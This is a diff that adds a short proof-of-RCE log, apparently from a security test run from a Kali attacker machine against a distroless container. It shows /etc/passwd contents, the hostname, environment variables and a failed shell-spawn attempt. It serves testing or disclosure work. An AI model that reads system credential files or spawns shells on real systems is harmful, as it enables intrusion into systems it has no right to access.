@@ -1,0 +1,13 @@
+############ [KALI, attacker] Proof of RCE ############
+Wed Aug 19 03:32:57 PM UTC 2026
+--- read /etc/passwd ---
+root:x:0:0:root:/root:/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/sbin/nologin
+nonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin
+
+--- hostname ---
+23a4aa5ccfc8
+--- process.env ---
+{"PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","HOSTNAME":"23a4aa5ccfc8","SSL_CERT_FILE":"/etc/ssl/certs/ca-certificates.crt","HOME":"/home/nonroot"}
+--- attempt full shell (expected to fail - distroless) ---
+ERR: spawnSync /bin/sh ENOENT
